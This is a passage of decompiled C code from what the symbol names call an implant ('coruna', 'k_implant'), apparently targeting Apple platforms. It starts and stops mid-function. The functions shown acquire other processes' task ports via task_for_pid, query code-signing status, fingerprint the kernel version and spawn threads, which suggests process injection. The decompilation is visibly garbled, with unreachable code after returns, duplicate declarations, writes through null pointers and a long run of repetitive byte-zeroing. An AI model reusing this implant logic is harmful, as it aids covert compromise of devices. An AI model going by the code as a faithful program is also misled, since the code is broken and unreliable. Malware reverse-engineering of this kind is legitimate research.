      if ((val == (uint64_t *)0x0) ||
         if (*(long *)k_implant_stack_chk_guard_slot == action) {
         return ptr;
         }
         ___stack_chk_fail();
      host_info = (int *)0x0;
      scratch = scratch & 0xffffffff00000000;
      err = (**(void (**)(arg + 0xc))(arg,0xf0000,&host_info,&scratch);
      if (*(long *)k_implant_stack_chk_guard_slot == action) {
      return ptr;
      }
      ___stack_chk_fail();
      err = *host_info;
      if (err < -0x30051202) {
        if ((err != -0x41450136) && (err != -0x35014542)) {
          status = -0x31051202;
cleanup:
          if (*(long *)k_implant_stack_chk_guard_slot == action) {
          return ptr;
          }
          ___stack_chk_fail();
        }
      }
      else if (1 < err + 0x1120532U) {
        status = -0x30051202;
        goto cleanup;
      }
      if (*(long *)k_implant_stack_chk_guard_slot == action) {
      return ptr;
      }
      ___stack_chk_fail();
      if (((arg == (short *)0x0) || (*arg != 2)) || ((ushort)arg[1] < 2)) {
        host_info = (int *)((unsigned long)host_info & 0xffffffffffffff00);
        err = coruna_csops_128d4(&host_info);
        if ((err != 0) || ((char)host_info != '\0')) {
          ptr = &k_implant_rodata_word_1e037;
          if (*(long *)k_implant_stack_chk_guard_slot == action) {
          return ptr;
          }
          ___stack_chk_fail();
        }
        ptr = _calloc(1,0x38);
        if (ptr != (long *)0x0) {
          str = _calloc(1,0x10);
          if (str == (uint64_t *)0x0) {
          ptr = (uint8_t *)0xad009;
          }
          else {
          *str = arg;
          host_info = (int *)0x0;
          ptr = (uint8_t *)coruna_mach_port_set_attributes_1af18(&host_info,arg);
          if ((int)ptr == 0) {
          scratch = 0;
          err = coruna_calloc(&scratch);
          if (err != 0) {
          ptr[6] = scratch;
          }
          ptr = (uint8_t *)0x0;
          *ptr = handle;
          ptr[2] = (long)arg;
          ptr[3] = (long)host_info;
          ptr[4] = (long)arg;
          ptr[5] = (long)str;
          *val = ptr;
          if (*(long *)k_implant_stack_chk_guard_slot == action) {
          return ptr;
          }
          ___stack_chk_fail();
          }
          coruna_rwlock_iface_destroy(str);
          }
          goto skip;
        }
      }
      else {
        ptr = _calloc(1,0x38);
        if (ptr != (long *)0x0) {
check_ok:
          str = _calloc(1,0x10);
          if (str == (uint64_t *)0x0) {
            ptr = (uint8_t *)0xad009;
          }
          else {
            *str = arg;
            host_info = (int *)0x0;
            ptr = (uint8_t *)coruna_mach_port_set_attributes_1af18(&host_info,arg);
            if ((int)ptr == 0) {
              scratch = 0;
              err = coruna_calloc(&scratch);
              if (err != 0) {
                ptr[6] = scratch;
              }
              ptr = (uint8_t *)0x0;
              *ptr = handle;
              ptr[2] = (long)arg;
              ptr[3] = (long)host_info;
              ptr[4] = (long)arg;
              ptr[5] = (long)str;
              *val = ptr;
              if (*(long *)k_implant_stack_chk_guard_slot == action) {
              return ptr;
              }
              ___stack_chk_fail();
            }
            coruna_rwlock_iface_destroy(str);
          }
skip:
          _free(ptr);
          if (*(long *)k_implant_stack_chk_guard_slot == action) {
          return ptr;
          }
          ___stack_chk_fail();
        }
      }
      ptr = (uint8_t *)0xad009;
      if (*(long *)k_implant_stack_chk_guard_slot == action) {
      return ptr;
      }
      ___stack_chk_fail();
    }
  }
  err = ___error();
  err = *err;
  buf = (uint *)___error();
  u = -*buf;
  if (-1 < err) {
    u = *buf;
  }
  ptr = (uint8_t *)(unsigned long)(u | 0x40000000);
fail:
  if (*(long *)k_implant_stack_chk_guard_slot == action) {
    return ptr;
  }
  ___stack_chk_fail();
}
int * coruna_mach_port_deallocate_19110(int *flags,char *path,uint64_t val,long handle,uint64_t id_2,
                  char *str_2,long addr_2,uint64_t size_3,uint64_t off_4,
                  uint64_t off_5,mach_port_name_t *arg,uint32_t *size)
{
  uint u;
  int *err;
  long *ptr;
  int *status;
  mach_port_name_t scratch;
  unsigned long bootargs;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  long thread_attr;
  
  thread_attr = *(long *)k_implant_stack_chk_guard_slot;
  status = (int *)0xad001;
  err = flags;
  if (flags != (int *)0x0) {
    if (path == (char *)0x0) {
      status = (int *)&k_implant_rodata_word_1e03f;
    }
    else {
      status = (int *)&k_implant_rodata_word_1e03f;
      if ((((*path != '\0') && (status = (int *)&k_implant_rodata_word_1e01c, handle != 0)) &&
          ((int)id_2 != 0)) &&
         ((status = (int *)&k_implant_rodata_word_1e01d, str_2 != (char *)0x0 && (*str_2 != '\0')))) {
        if (((int)size_3 == 0) || (addr_2 != 0)) {
          ptr = *(long **)(flags + 10);
          status = (int *)0xad001;
          if (ptr != (long *)0x0) {
            scratch = k_implant_rodata_word_0001e948;
            bootargs = k_implant_rodata_word_1e940;
            thread_attr = k_implant_rodata_word_0001e958;
            bootargs = k_implant_rodata_word_1e950;
            status = (int *)(**(void (**)(*ptr + 0x40))(*ptr,ptr + 1,&bootargs,2,0);
            err = status;
            if ((int)status == 0) {
              bootargs = bootargs & 0xffffffff00000000;
              status = (int *)coruna_realpath(path,val,&bootargs);
              err = status;
              if ((int)status == 0) {
                scratch = 0;
                status = (int *)coruna_task_for_pid(*(uint64_t *)(flags + 10),bootargs & 0xffffffff,
                                             &scratch);
                if ((uint)status == 0) {
                  status = (int *)coruna_objc_msgsend(flags,scratch,handle,id_2,str_2,addr_2,
                                               size_3,off_4,off_5);
                  if ((int)status == 0) {
                    if (arg != (mach_port_name_t *)0x0) {
                      *arg = scratch;
                      scratch = 0;
                    }
                    if (size != (uint32_t *)0x0) {
                      *size = (uint32_t)bootargs;
                    }
                  }
                  err = status;
                  if (1 < scratch + 1) {
                    u = *(uint *)k_implant_mach_task_self_slot;
                    err = (int *)(unsigned long)u;
                    if (u != scratch) {
                      u = _mach_port_deallocate(u,scratch);
                      err = (int *)(unsigned long)u;
                    }
                  }
                }
                else {
                  err = (int *)_csops_audittoken(bootargs & 0xffffffff,0,0,0,1);
                  if ((int)err != 0) {
                    err = ___error();
                    u = 0x1e03f;
                    if (*err != 3) {
                      u = (uint)status;
                    }
                    status = (int *)(unsigned long)u;
                  }
                }
              }
              ptr = *(long **)(flags + 10);
              if ((ptr != (long *)0x0) && (ptr[1] != 0)) {
                err = (int *)(**(void (**)(*ptr + 0x30))();
              }
            }
          }
        }
        else {
          status = (int *)&k_implant_rodata_word_1e01e;
        }
      }
    }
  }
  if (*(long *)k_implant_stack_chk_guard_slot == thread_attr) {
    return status;
  }
  ___stack_chk_fail(err);
}





uint8_t * coruna_objc_msgsend(uint64_t *val,uint64_t id_2,long handle,uint64_t size_3,char *path,
            long addr_2,uint64_t off_4,uint64_t off_5,uint64_t off_6)
{
  kern_return_t lk1;
  int err;
  pid_t lp3;
  int status;
  uint8_t *ptr;
  mach_port_name_t t;
  long handle;
  uint32_t scratch;
  int bootargs;
  unsigned long thread_attr;
  uint64_t host_info;
  uint32_t serial_buf;
  
  bootargs = -1;
  if (val == (uint64_t *)0x0) {
    return (uint8_t *)0xad001;
  }
  t = (mach_port_name_t)id_2;
  if (t + 1 < 2) {
    return &k_implant_rodata_word_1e009;
  }
  if (handle == 0) {
    return &k_implant_rodata_word_1e01c;
  }
  if ((int)size_3 == 0) {
    return &k_implant_rodata_word_1e01c;
  }
  if (path == (char *)0x0) {
    return &k_implant_rodata_word_1e01d;
  }
  if (*path == '\0') {
    return &k_implant_rodata_word_1e01d;
  }
  if (((int)off_4 != 0) && (addr_2 == 0)) {
    return &k_implant_rodata_word_1e01e;
  }
  lk1 = _pid_for_task(t,&bootargs);
  status = bootargs;
  if (lk1 == 0) {
    serial_buf = 0;
    host_info = 0;
    err = coruna_host_kernel_version(&host_info);
    if ((err == 0) && (0 < status)) {
      lp3 = _getpid();
      if (lp3 != status) {
        thread_attr = 0;
        status = _proc_pidinfo(status,0x13,0,&thread_attr,8);
        return &k_implant_rodata_word_1e03f;
        if ((thread_attr & 0xfffffe00000000) != 0) {
          return &k_implant_rodata_word_1e03f;
        }
      }
      ptr = (uint8_t *)coruna_implant65fc_via_ctx_free_11dc8_4(*val,id_2,handle,size_3);
      if ((int)ptr != 0) {
        return ptr;
      }
      host_info = coruna_u64_pack((host_info), (0xffffffff));
      lk1 = _pid_for_task(t,(int *)&host_info);
      if ((((lk1 == 0) && (0 < (int)host_info)) && (handle = val[6], handle != 0)) &&
         (((*(long *)(handle + 8) != 0 && (*(long *)(handle + 0x18) != 0)) &&
          (status = _objc_msgSend(), status == 2)))) {
        return &k_implant_rodata_word_1e041;
      }
      thread_attr = thread_attr & 0xffffffff00000000;
      scratch = 0;
      ptr = (uint8_t *)coruna_pthread_create(val[3],&thread_attr,&scratch);
      if ((int)ptr != 0) {
        return ptr;
      }
      ptr = (uint8_t *)coruna_implant65fc_residual_122(val[5],id_2);
      if ((int)ptr != 0) {
        return ptr;
      }
      host_info = 0;
      ptr = (uint8_t *)
               coruna_mach_port_deallocate_17b60(&host_info,*val,id_2,val[2],thread_attr & 0xffffffff,scratch);
      if ((int)ptr != 0) {
        return ptr;
      }
      ptr = (uint8_t *)
               coruna_pthread_attr_setdetachstate_17d10(host_info,handle,size_3,off_5,path,addr_2,off_4,off_6);
      coruna_mach_port_deallocate(host_info);
      return ptr;
    }
  }
fail:
  return &k_implant_rodata_word_1e03f;
}
int * coruna_mach_port_deallocate_19584(int *flags,uint64_t val,long handle,uint64_t id_2,char *path,
                  long addr_2,uint64_t size_3,uint64_t off_4,uint64_t off_5,
                  mach_port_name_t *arg)
{
  uint u;
  int *err;
  long *ptr;
  int *status;
  unsigned long scratch;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  long bootargs;
  
  bootargs = *(long *)k_implant_stack_chk_guard_slot;
  status = (int *)0xad001;
  err = flags;
  if (*(long *)k_implant_stack_chk_guard_slot == bootargs) {
  return status;
  }
  ___stack_chk_fail(err);
  if ((int)val < 1) {
    status = (int *)&k_implant_rodata_word_1e03f;
    if (*(long *)k_implant_stack_chk_guard_slot == bootargs) {
    return status;
    }
    ___stack_chk_fail(err);
  }
  status = (int *)&k_implant_rodata_word_1e01c;
  if (*(long *)k_implant_stack_chk_guard_slot == bootargs) {
  return status;
  }
  ___stack_chk_fail(err);
  if (path == (char *)0x0) {
    status = (int *)&k_implant_rodata_word_1e01d;
    if (*(long *)k_implant_stack_chk_guard_slot == bootargs) {
    return status;
    }
    ___stack_chk_fail(err);
  }
  status = (int *)&k_implant_rodata_word_1e01d;
  if (*(long *)k_implant_stack_chk_guard_slot == bootargs) {
  return status;
  }
  ___stack_chk_fail(err);
  if (((int)size_3 != 0) && (addr_2 == 0)) {
    status = (int *)&k_implant_rodata_word_1e01e;
    if (*(long *)k_implant_stack_chk_guard_slot == bootargs) {
    return status;
    }
    ___stack_chk_fail(err);
  }
  ptr = *(long **)(flags + 10);
  status = (int *)0xad001;
  if (*(long *)k_implant_stack_chk_guard_slot == bootargs) {
  return status;
  }
  ___stack_chk_fail(err);
  scratch = k_implant_rodata_word_0001e948;
  scratch = k_implant_rodata_word_1e940;
  thread_attr = k_implant_rodata_word_0001e958;
  bootargs = k_implant_rodata_word_1e950;
  status = (int *)(**(void (**)(*ptr + 0x40))(*ptr,ptr + 1,&scratch,2,0);
  err = status;
  if (*(long *)k_implant_stack_chk_guard_slot == bootargs) {
  return status;
  }
  ___stack_chk_fail(err);
  scratch = scratch & 0xffffffff00000000;
  status = (int *)coruna_task_for_pid(*(uint64_t *)(flags + 10),val,&scratch);
  if ((uint)status == 0) {
    status = (int *)coruna_objc_msgsend(flags,scratch & 0xffffffff,handle,id_2,path,addr_2,
                                 size_3,off_4,off_5);
    err = status;
    if (((int)status == 0) && (arg != (mach_port_name_t *)0x0)) {
      *arg = (mach_port_name_t)scratch;
      status = (int *)0x0;
done:
      scratch = scratch & 0xffffffff00000000;
    }
    else if (1 < (mach_port_name_t)scratch + 1) {
      u = *(uint *)k_implant_mach_task_self_slot;
      err = (int *)(unsigned long)u;
      if (u != (mach_port_name_t)scratch) {
        u = _mach_port_deallocate(u,(mach_port_name_t)scratch);
        err = (int *)(unsigned long)u;
        goto done;
      }
    }
  }
  else {
    err = (int *)_csops_audittoken(val,0,0,0,1);
    if ((int)err != 0) {
      err = ___error();
      u = 0x1e03f;
      if (*err != 3) {
        u = (uint)status;
      }
      status = (int *)(unsigned long)u;
    }
  }
  ptr = *(long **)(flags + 10);
  if ((ptr != (long *)0x0) && (ptr[1] != 0)) {
    err = (int *)(**(void (**)(*ptr + 0x30))();
  }
fail:
  if (*(long *)k_implant_stack_chk_guard_slot == bootargs) {
    return status;
  }
  ___stack_chk_fail(err);
}





uint32_t coruna_host_kernel_version(void)
{
  mach_port_t host;
  kern_return_t lk1;
  int err;
  char *ptr;
  uint32_t u;
  uint64_t scratch;
  size_t bootargs;
  char thread_attr [520];
  long host_info;
  
  host_info = *(long *)k_implant_stack_chk_guard_slot;
  u = 0xad011;
  thread_attr[0x1e8] = '\0';
  thread_attr[0x1e9] = '\0';
  thread_attr[0x1ea] = '\0';
  thread_attr[0x1eb] = '\0';
  thread_attr[0x1ec] = '\0';
  thread_attr[0x1ed] = '\0';
  thread_attr[0x1ee] = '\0';
  thread_attr[0x1ef] = '\0';
  thread_attr[0x1e0] = '\0';
  thread_attr[0x1e1] = '\0';
  thread_attr[0x1e2] = '\0';
  thread_attr[0x1e3] = '\0';
  thread_attr[0x1e4] = '\0';
  thread_attr[0x1e5] = '\0';
  thread_attr[0x1e6] = '\0';
  thread_attr[0x1e7] = '\0';
  thread_attr[0x1f8] = '\0';
  thread_attr[0x1f9] = '\0';
  thread_attr[0x1fa] = '\0';
  thread_attr[0x1fb] = '\0';
  thread_attr[0x1fc] = '\0';
  thread_attr[0x1fd] = '\0';
  thread_attr[0x1fe] = '\0';
  thread_attr[0x1ff] = '\0';
  thread_attr[0x1f0] = '\0';
  thread_attr[0x1f1] = '\0';
  thread_attr[0x1f2] = '\0';
  thread_attr[499] = '\0';
  thread_attr[500] = '\0';
  thread_attr[0x1f5] = '\0';
  thread_attr[0x1f6] = '\0';
  thread_attr[0x1f7] = '\0';
  thread_attr[0x1c8] = '\0';
  thread_attr[0x1c9] = '\0';
  thread_attr[0x1ca] = '\0';
  thread_attr[0x1cb] = '\0';
  thread_attr[0x1cc] = '\0';
  thread_attr[0x1cd] = '\0';
  thread_attr[0x1ce] = '\0';
  thread_attr[0x1cf] = '\0';
  thread_attr[0x1c0] = '\0';
  thread_attr[0x1c1] = '\0';
  thread_attr[0x1c2] = '\0';
  thread_attr[0x1c3] = '\0';
  thread_attr[0x1c4] = '\0';
  thread_attr[0x1c5] = '\0';
  thread_attr[0x1c6] = '\0';
  thread_attr[0x1c7] = '\0';
  thread_attr[0x1d8] = '\0';
  thread_attr[0x1d9] = '\0';
  thread_attr[0x1da] = '\0';
  thread_attr[0x1db] = '\0';
  thread_attr[0x1dc] = '\0';
  thread_attr[0x1dd] = '\0';
  thread_attr[0x1de] = '\0';
  thread_attr[0x1df] = '\0';
  thread_attr[0x1d0] = '\0';
  thread_attr[0x1d1] = '\0';
  thread_attr[0x1d2] = '\0';
  thread_attr[0x1d3] = '\0';
  thread_attr[0x1d4] = '\0';
  thread_attr[0x1d5] = '\0';
  thread_attr[0x1d6] = '\0';
  thread_attr[0x1d7] = '\0';
  thread_attr[0x1a8] = '\0';
  thread_attr[0x1a9] = '\0';
  thread_attr[0x1aa] = '\0';
  thread_attr[0x1ab] = '\0';
  thread_attr[0x1ac] = '\0';
  thread_attr[0x1ad] = '\0';
  thread_attr[0x1ae] = '\0';
  thread_attr[0x1af] = '\0';
  thread_attr[0x1a0] = '\0';
  thread_attr[0x1a1] = '\0';
  thread_attr[0x1a2] = '\0';
  thread_attr[0x1a3] = '\0';
  thread_attr[0x1a4] = '\0';
  thread_attr[0x1a5] = '\0';
  thread_attr[0x1a6] = '\0';
  thread_attr[0x1a7] = '\0';
  thread_attr[0x1b8] = '\0';
  thread_attr[0x1b9] = '\0';
  thread_attr[0x1ba] = '\0';
  thread_attr[0x1bb] = '\0';
  thread_attr[0x1bc] = '\0';
  thread_attr[0x1bd] = '\0';
  thread_attr[0x1be] = '\0';
  thread_attr[0x1bf] = '\0';
  thread_attr[0x1b0] = '\0';
  thread_attr[0x1b1] = '\0';
  thread_attr[0x1b2] = '\0';
  thread_attr[0x1b3] = '\0';
  thread_attr[0x1b4] = '\0';
  thread_attr[0x1b5] = '\0';
  thread_attr[0x1b6] = '\0';
  thread_attr[0x1b7] = '\0';
  thread_attr[0x188] = '\0';
  thread_attr[0x189] = '\0';
  thread_attr[0x18a] = '\0';
  thread_attr[0x18b] = '\0';
  thread_attr[0x18c] = '\0';
  thread_attr[0x18d] = '\0';
  thread_attr[0x18e] = '\0';
  thread_attr[399] = '\0';
  thread_attr[0x180] = '\0';
  thread_attr[0x181] = '\0';
  thread_attr[0x182] = '\0';
  thread_attr[0x183] = '\0';
  thread_attr[0x184] = '\0';
  thread_attr[0x185] = '\0';
  thread_attr[0x186] = '\0';
  thread_attr[0x187] = '\0';
  thread_attr[0x198] = '\0';
  thread_attr[0x199] = '\0';
  thread_attr[0x19a] = '\0';
  thread_attr[0x19b] = '\0';
  thread_attr[0x19c] = '\0';
  thread_attr[0x19d] = '\0';
  thread_attr[0x19e] = '\0';
  thread_attr[0x19f] = '\0';
  thread_attr[400] = '\0';
  thread_attr[0x191] = '\0';
  thread_attr[0x192] = '\0';
  thread_attr[0x193] = '\0';
  thread_attr[0x194] = '\0';
  thread_attr[0x195] = '\0';
  thread_attr[0x196] = '\0';
  thread_attr[0x197] = '\0';
  thread_attr[0x168] = '\0';
  thread_attr[0x169] = '\0';
  thread_attr[0x16a] = '\0';
  thread_attr[0x16b] = '\0';
  thread_attr[0x16c] = '\0';
  thread_attr[0x16d] = '\0';
  thread_attr[0x16e] = '\0';
  thread_attr[0x16f] = '\0';
  thread_attr[0x160] = '\0';
  thread_attr[0x161] = '\0';
  thread_attr[0x162] = '\0';
  thread_attr[0x163] = '\0';
  thread_attr[0x164] = '\0';
  thread_attr[0x165] = '\0';
  thread_attr[0x166] = '\0';
  thread_attr[0x167] = '\0';
  thread_attr[0x178] = '\0';
  thread_attr[0x179] = '\0';
  thread_attr[0x17a] = '\0';
  thread_attr[0x17b] = '\0';
  thread_attr[0x17c] = '\0';
  thread_attr[0x17d] = '\0';
  thread_attr[0x17e] = '\0';
  thread_attr[0x17f] = '\0';
  thread_attr[0x170] = '\0';
  thread_attr[0x171] = '\0';
  thread_attr[0x172] = '\0';
  thread_attr[0x173] = '\0';
  thread_attr[0x174] = '\0';
  thread_attr[0x175] = '\0';
  thread_attr[0x176] = '\0';
  thread_attr[0x177] = '\0';
  thread_attr[0x148] = '\0';
  thread_attr[0x149] = '\0';
  thread_attr[0x14a] = '\0';
  thread_attr[0x14b] = '\0';
  thread_attr[0x14c] = '\0';
  thread_attr[0x14d] = '\0';
  thread_attr[0x14e] = '\0';
  thread_attr[0x14f] = '\0';
  thread_attr[0x140] = '\0';
  thread_attr[0x141] = '\0';
  thread_attr[0x142] = '\0';
  thread_attr[0x143] = '\0';
  thread_attr[0x144] = '\0';
  thread_attr[0x145] = '\0';
  thread_attr[0x146] = '\0';
  thread_attr[0x147] = '\0';
  thread_attr[0x158] = '\0';
  thread_attr[0x159] = '\0';
  thread_attr[0x15a] = '\0';
  thread_attr[0x15b] = '\0';
  thread_attr[0x15c] = '\0';
  thread_attr[0x15d] = '\0';
  thread_attr[0x15e] = '\0';
  thread_attr[0x15f] = '\0';
  thread_attr[0x150] = '\0';
  thread_attr[0x151] = '\0';
  thread_attr[0x152] = '\0';
  thread_attr[0x153] = '\0';
  thread_attr[0x154] = '\0';
  thread_attr[0x155] = '\0';
  thread_attr[0x156] = '\0';
  thread_attr[0x157] = '\0';
  thread_attr[0x128] = '\0';
  thread_attr[0x129] = '\0';
  thread_attr[0x12a] = '\0';
  thread_attr[299] = '\0';
  thread_attr[300] = '\0';
  thread_attr[0x12d] = '\0';
  thread_attr[0x12e] = '\0';
  thread_attr[0x12f] = '\0';
  thread_attr[0x120] = '\0';
  thread_attr[0x121] = '\0';
  thread_attr[0x122] = '\0';
  thread_attr[0x123] = '\0';
  thread_attr[0x124] = '\0';
  thread_attr[0x125] = '\0';
  thread_attr[0x126] = '\0';
  thread_attr[0x127] = '\0';
  thread_attr[0x138] = '\0';
  thread_attr[0x139] = '\0';
  thread_attr[0x13a] = '\0';
  thread_attr[0x13b] = '\0';
  thread_attr[0x13c] = '\0';
  thread_attr[0x13d] = '\0';
  thread_attr[0x13e] = '\0';
  thread_attr[0x13f] = '\0';
  thread_attr[0x130] = '\0';
  thread_attr[0x131] = '\0';
  thread_attr[0x132] = '\0';
  thread_attr[0x133] = '\0';
  thread_attr[0x134] = '\0';
  thread_attr[0x135] = '\0';
  thread_attr[0x136] = '\0';
  thread_attr[0x137] = '\0';
  thread_attr[0x108] = '\0';
  thread_attr[0x109] = '\0';
  thread_attr[0x10a] = '\0';
  thread_attr[0x10b] = '\0';
  thread_attr[0x10c] = '\0';
  thread_attr[0x10d] = '\0';
  thread_attr[0x10e] = '\0';
  thread_attr[0x10f] = '\0';
  thread_attr[0x100] = '\0';
  thread_attr[0x101] = '\0';
  thread_attr[0x102] = '\0';
  thread_attr[0x103] = '\0';
  thread_attr[0x104] = '\0';
  thread_attr[0x105] = '\0';
  thread_attr[0x106] = '\0';
  thread_attr[0x107] = '\0';
  thread_attr[0x118] = '\0';
  thread_attr[0x119] = '\0';
  thread_attr[0x11a] = '\0';
  thread_attr[0x11b] = '\0';
  thread_attr[0x11c] = '\0';
  thread_attr[0x11d] = '\0';
  thread_attr[0x11e] = '\0';
  thread_attr[0x11f] = '\0';
  thread_attr[0x110] = '\0';
  thread_attr[0x111] = '\0';
  thread_attr[0x112] = '\0';
  thread_attr[0x113] = '\0';
  thread_attr[0x114] = '\0';
  thread_attr[0x115] = '\0';
  thread_attr[0x116] = '\0';
  thread_attr[0x117] = '\0';
  thread_attr[0xe8] = '\0';
  thread_attr[0xe9] = '\0';
  thread_attr[0xea] = '\0';
  thread_attr[0xeb] = '\0';
  thread_attr[0xec] = '\0';
  thread_attr[0xed] = '\0';
  thread_attr[0xee] = '\0';
  thread_attr[0xef] = '\0';
  thread_attr[0xe0] = '\0';
  thread_attr[0xe1] = '\0';
  thread_attr[0xe2] = '\0';
  thread_attr[0xe3] = '\0';
  thread_attr[0xe4] = '\0';
  thread_attr[0xe5] = '\0';
  thread_attr[0xe6] = '\0';
  thread_attr[0xe7] = '\0';
  thread_attr[0xf8] = '\0';
  thread_attr[0xf9] = '\0';
  thread_attr[0xfa] = '\0';
  thread_attr[0xfb] = '\0';
  thread_attr[0xfc] = '\0';
  thread_attr[0xfd] = '\0';
  thread_attr[0xfe] = '\0';
  thread_attr[0xff] = '\0';
  thread_attr[0xf0] = '\0';
  thread_attr[0xf1] = '\0';
  thread_attr[0xf2] = '\0';
  thread_attr[0xf3] = '\0';
  thread_attr[0xf4] = '\0';
  thread_attr[0xf5] = '\0';
  thread_attr[0xf6] = '\0';
  thread_attr[0xf7] = '\0';
  thread_attr[200] = '\0';
  thread_attr[0xc9] = '\0';
  thread_attr[0xca] = '\0';
  thread_attr[0xcb] = '\0';
  thread_attr[0xcc] = '\0';
  thread_attr[0xcd] = '\0';
  thread_attr[0xce] = '\0';
  thread_attr[0xcf] = '\0';
  thread_attr[0xc0] = '\0';
  thread_attr[0xc1] = '\0';
  thread_attr[0xc2] = '\0';
  thread_attr[0xc3] = '\0';
  thread_attr[0xc4] = '\0';
  thread_attr[0xc5] = '\0';
  thread_attr[0xc6] = '\0';
  thread_attr[199] = '\0';
  thread_attr[0xd8] = '\0';
  thread_attr[0xd9] = '\0';
  thread_attr[0xda] = '\0';
  thread_attr[0xdb] = '\0';
  thread_attr[0xdc] = '\0';
  thread_attr[0xdd] = '\0';
  thread_attr[0xde] = '\0';
  thread_attr[0xdf] = '\0';
  thread_attr[0xd0] = '\0';
  thread_attr[0xd1] = '\0';
  thread_attr[0xd2] = '\0';
  thread_attr[0xd3] = '\0';
  thread_attr[0xd4] = '\0';
  thread_attr[0xd5] = '\0';
  thread_attr[0xd6] = '\0';
  thread_attr[0xd7] = '\0';
  thread_attr[0xa8] = '\0';
  thread_attr[0xa9] = '\0';
  thread_attr[0xaa] = '\0';
  thread_attr[0xab] = '\0';
  thread_attr[0xac] = '\0';
  thread_attr[0xad] = '\0';
  thread_attr[0xae] = '\0';
  thread_attr[0xaf] = '\0';
  thread_attr[0xa0] = '\0';
  thread_attr[0xa1] = '\0';
  thread_attr[0xa2] = '\0';
  thread_attr[0xa3] = '\0';
  thread_attr[0xa4] = '\0';
  thread_attr[0xa5] = '\0';
  thread_attr[0xa6] = '\0';
  thread_attr[0xa7] = '\0';
  thread_attr[0xb8] = '\0';
  thread_attr[0xb9] = '\0';
  thread_attr[0xba] = '\0';
  thread_attr[0xbb] = '\0';
  thread_attr[0xbc] = '\0';
  thread_attr[0xbd] = '\0';
  thread_attr[0xbe] = '\0';
  thread_attr[0xbf] = '\0';
  thread_attr[0xb0] = '\0';
  thread_attr[0xb1] = '\0';
  thread_attr[0xb2] = '\0';
  thread_attr[0xb3] = '\0';
  thread_attr[0xb4] = '\0';
  thread_attr[0xb5] = '\0';
  thread_attr[0xb6] = '\0';
  thread_attr[0xb7] = '\0';
  thread_attr[0x88] = '\0';
  thread_attr[0x89] = '\0';
  thread_attr[0x8a] = '\0';
  thread_attr[0x8b] = '\0';
  thread_attr[0x8c] = '\0';
  thread_attr[0x8d] = '\0';
  thread_attr[0x8e] = '\0';
  thread_attr[0x8f] = '\0';
  thread_attr[0x80] = '\0';
  thread_attr[0x81] = '\0';
  thread_attr[0x82] = '\0';
  thread_attr[0x83] = '\0';
  thread_attr[0x84] = '\0';
  thread_attr[0x85] = '\0';
  thread_attr[0x86] = '\0';
  thread_attr[0x87] = '\0';
  thread_attr[0x98] = '\0';
  thread_attr[0x99] = '\0';
  thread_attr[0x9a] = '\0';
  thread_attr[0x9b] = '\0';
  thread_attr[0x9c] = '\0';
  thread_attr[0x9d] = '\0';
  thread_attr[0x9e] = '\0';
  thread_attr[0x9f] = '\0';
  thread_attr[0x90] = '\0';
  thread_attr[0x91] = '\0';
  thread_attr[0x92] = '\0';
  thread_attr[0x93] = '\0';
  thread_attr[0x94] = '\0';
  thread_attr[0x95] = '\0';
  thread_attr[0x96] = '\0';
  thread_attr[0x97] = '\0';
  thread_attr[0x68] = '\0';
  thread_attr[0x69] = '\0';
  thread_attr[0x6a] = '\0';
  thread_attr[0x6b] = '\0';
  thread_attr[0x6c] = '\0';
  thread_attr[0x6d] = '\0';
  thread_attr[0x6e] = '\0';
  thread_attr[0x6f] = '\0';
  thread_attr[0x60] = '\0';
  thread_attr[0x61] = '\0';
  thread_attr[0x62] = '\0';
  thread_attr[99] = '\0';
  thread_attr[100] = '\0';
  thread_attr[0x65] = '\0';
  thread_attr[0x66] = '\0';
  thread_attr[0x67] = '\0';
  thread_attr[0x78] = '\0';
  thread_attr[0x79] = '\0';
  thread_attr[0x7a] = '\0';
  thread_attr[0x7b] = '\0';
  thread_attr[0x7c] = '\0';
  thread_attr[0x7d] = '\0';
  thread_attr[0x7e] = '\0';
  thread_attr[0x7f] = '\0';
  thread_attr[0x70] = '\0';
  thread_attr[0x71] = '\0';
  thread_attr[0x72] = '\0';
  thread_attr[0x73] = '\0';
  thread_attr[0x74] = '\0';
  thread_attr[0x75] = '\0';
  thread_attr[0x76] = '\0';
  thread_attr[0x77] = '\0';
  thread_attr[0x48] = '\0';
  thread_attr[0x49] = '\0';
  thread_attr[0x4a] = '\0';
  thread_attr[0x4b] = '\0';
  thread_attr[0x4c] = '\0';
  thread_attr[0x4d] = '\0';
  thread_attr[0x4e] = '\0';
  thread_attr[0x4f] = '\0';
  thread_attr[0x40] = '\0';
  thread_attr[0x41] = '\0';
  thread_attr[0x42] = '\0';
  thread_attr[0x43] = '\0';
  thread_attr[0x44] = '\0';
  thread_attr[0x45] = '\0';
  thread_attr[0x46] = '\0';
  thread_attr[0x47] = '\0';
  thread_attr[0x58] = '\0';
  thread_attr[0x59] = '\0';
  thread_attr[0x5a] = '\0';
  thread_attr[0x5b] = '\0';
  thread_attr[0x5c] = '\0';
  thread_attr[0x5d] = '\0';
  thread_attr[0x5e] = '\0';
  thread_attr[0x5f] = '\0';
  thread_attr[0x50] = '\0';
  thread_attr[0x51] = '\0';
  thread_attr[0x52] = '\0';
  thread_attr[0x53] = '\0';
  thread_attr[0x54] = '\0';
  thread_attr[0x55] = '\0';
  thread_attr[0x56] = '\0';
  thread_attr[0x57] = '\0';
  thread_attr[0x28] = '\0';
  thread_attr[0x29] = '\0';
  thread_attr[0x2a] = '\0';
  thread_attr[0x2b] = '\0';
  thread_attr[0x2c] = '\0';
  thread_attr[0x2d] = '\0';
  thread_attr[0x2e] = '\0';
  thread_attr[0x2f] = '\0';
  thread_attr[0x20] = '\0';
  thread_attr[0x21] = '\0';
  thread_attr[0x22] = '\0';
  thread_attr[0x23] = '\0';
  thread_attr[0x24] = '\0';
  thread_attr[0x25] = '\0';
  thread_attr[0x26] = '\0';
  thread_attr[0x27] = '\0';
  thread_attr[0x38] = '\0';
  thread_attr[0x39] = '\0';
  thread_attr[0x3a] = '\0';
  thread_attr[0x3b] = '\0';
  thread_attr[0x3c] = '\0';
  thread_attr[0x3d] = '\0';
  thread_attr[0x3e] = '\0';
  thread_attr[0x3f] = '\0';
  thread_attr[0x30] = '\0';
  thread_attr[0x31] = '\0';
  thread_attr[0x32] = '\0';
  thread_attr[0x33] = '\0';
  thread_attr[0x34] = '\0';
  thread_attr[0x35] = '\0';
  thread_attr[0x36] = '\0';
  thread_attr[0x37] = '\0';
  thread_attr[8] = '\0';
  thread_attr[9] = '\0';
  thread_attr[10] = '\0';
